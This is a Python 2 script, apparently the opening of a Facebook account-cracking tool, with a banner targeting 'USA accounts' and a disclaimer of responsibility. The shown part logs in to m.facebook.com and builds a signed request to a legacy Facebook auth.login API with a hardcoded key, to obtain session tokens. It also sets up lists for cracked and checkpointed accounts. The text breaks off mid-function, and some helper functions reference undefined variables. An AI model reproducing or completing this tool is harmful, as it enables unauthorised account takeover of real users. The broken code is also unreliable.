#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Mr HACKER XD

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.07)

##### LOGO #####
logo = """
 \033[1;98m●▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●●▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
\033[1;97m╭━━━┳╮╱╭┳━━━┳╮╭━╮╭╮╱╭┳━━━┳━━━╮\033[1;94m▒▒▒▒   ╱▔▔▔▔╲ ▒▒▒  FUCK USA ACCOUNTS 🔥
\033[1;97m┃╭━━┫┃╱┃┃╭━╮┃┃┃╭╯┃┃╱┃┃╭━╮┃╭━╮┃\033[1;94m▒▒▒▒ ▕ ╲┊┊╱▏ ▏▒▒▒ WE ARE PAKISTANIS 🔥
\033[1;93m┃╰━━┫┃╱┃┃┃╱╰┫╰╯╯╱┃┃╱┃┃╰━━┫┃╱┃┃\033[1;94m▒▒▒▒ ▕▕▂╱╲▂▏▏▒▒▒ WE HAVE POWER 🔥
\033[1;93m┃╭━━┫┃╱┃┃┃╱╭┫╭╮┃╱┃┃╱┃┣━━╮┃╰━╯┃\033[1;94m▒▒▒▒   ╲┊┊┊┊╱ ▒▒▒▒
\033[1;91m┃┃╱╱┃╰━╯┃╰━╯┃┃┃╰╮┃╰━╯┃╰━╯┃╭━╮┃\033[1;94m▒▒▒▒    ╲▂▂╱▏ ▒▒▒▒
\033[1;91m╰╯╱╱╰━━━┻━━━┻╯╰━╯╰━━━┻━━━┻╯╱╰╯\033[1;94m▒▒▒╱▔▔┊┊┊┊▔▔╲▒▒▒
\033[1;98m●▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●●▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
\033[1;91m╔🔥═══════════════════════════════════════════🔥═🔥═🔥╗
\033[1;91m║\033[1;91m☆ \033[1;91mCOMMANDS MAKER Rana Aahil.☠️           ║
\033[1;91m║\033[1;91m☆ \033[1;91mYOUTUBE CHANEEL Aahil Creations.☠️     ║
\033[1;91m║\033[1;91m☆ \033[1;91mIM.NOT.RISPONSIBLE.FOR.ANY.MISS USE.☠️ ║
\033[1;91m╚🔥═══════════════════════════════════════════🔥═🔥═🔥╝
"""

###### LOGO2 ######
logo2 = """
	\033[1;32;40m  
██████╗░░█████╗░███╗░░██╗░█████╗░
██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╔╝███████║██╔██╗██║███████║
██╔══██╗██╔══██║██║╚████║██╔══██║
██║░░██║██║░░██║██║░╚███║██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝
  
"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;91m█████████████████▒▒▒▒▒▒▒▒..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")

def login():
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		print('\033[1;96m[☆] \x1b[1;91mLOGIN KRO APNA ACOUNT \x1b[1;96m[☆]' )
		id = raw_input('\033[1;91m[+] \x1b[1;91mID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('\033[1;91m[+] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;96m[!] \x1b[1;93mTidak ada koneksi"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				
